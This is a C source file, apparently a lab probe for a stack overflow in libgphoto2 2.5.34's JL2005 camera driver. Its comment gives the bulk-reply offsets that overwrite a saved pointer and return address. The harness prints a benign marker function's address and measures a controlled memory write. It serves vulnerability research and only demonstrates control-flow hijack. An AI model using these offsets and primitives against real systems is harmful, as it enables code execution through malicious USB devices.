/* W191 lab probe: real clang-built libgphoto2 2.5.34 with the committed
 * vusb p-mode patch plus a lab-only RET knob. On the clang frame, device
 * reply bytes at bulk offset 0x3E30 reach the spilled `priv` slot and bulk
 * offset 0x3E58 reaches jl2005c_init's saved RIP. With no canary, a chosen
 * reply can therefore set the :154 memmove destination AND the return
 * target. The benign marker below is a probe function, never a command:
 * reaching it demonstrates control-flow selection only, not rung 5. */
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <gphoto2/gphoto2.h>
#include <gphoto2/gphoto2-port-info-list.h>

unsigned char m2s_sink[0x6000];

static void m2s_marker(void)
{
	puts("M2SHELL_W191_BENIGN_MARKER");
	fflush(stdout);
	_exit(42);
}

static void report(const char *when)
{
	size_t i, n5a = 0, first = (size_t)-1, last = (size_t)-1;
	printf("%s SINK=%p", when, (void *)m2s_sink);
	for (i = 0; i < 0x4200; i++) if (m2s_sink[i] == 0x5a) {
		n5a++;
		if (first == (size_t)-1) first = i;
		last = i;
	}
	printf(" COUNT_5A=%zu FIRST_5A=%zu LAST_5A=%zu\n", n5a, first, last);
	fflush(stdout);
}

static void on_segv(int sig)
{
	(void)sig;
	report("SIGSEGV");
	_exit(139);
}

int main(void)
{
	Camera *cam = NULL;
	CameraAbilitiesList *al = NULL;
	CameraAbilities ab;
	GPPortInfoList *il = NULL;
	GPPortInfo pi;
	int m, idx, rc;

	setvbuf(stdout, NULL, _IONBF, 0);
	signal(SIGSEGV, on_segv);
	memset(m2s_sink, 0x11, sizeof(m2s_sink));
	printf("MARKER=%p\n", (void *)m2s_marker);
	report("BEFORE");

	if (gp_camera_new(&cam) < GP_OK) return 2;
	if (gp_abilities_list_new(&al) < GP_OK) return 2;
	if (gp_abilities_list_load(al, NULL) < GP_OK) return 2;
	m = gp_abilities_list_lookup_model(al, " JL2005B/C/D camera");
	if (m < 0) return 2;
	if (gp_abilities_list_get_abilities(al, m, &ab) < GP_OK) return 2;
	if (gp_camera_set_abilities(cam, ab) < GP_OK) return 2;
	if (gp_port_info_list_new(&il) < GP_OK) return 2;
	if (gp_port_info_list_load(il) < GP_OK) return 2;
	idx = gp_port_info_list_lookup_path(il, "usb:001,001");
	if (idx < 0) return 2;
	if (gp_port_info_list_get_info(il, idx, &pi) < GP_OK) return 2;
	if (gp_camera_set_port_info(cam, pi) < GP_OK) return 2;

	rc = gp_camera_init(cam, NULL);
	printf("gp_camera_init rc=%d\n", rc);
	report("AFTER_INIT");
	return 0;
}
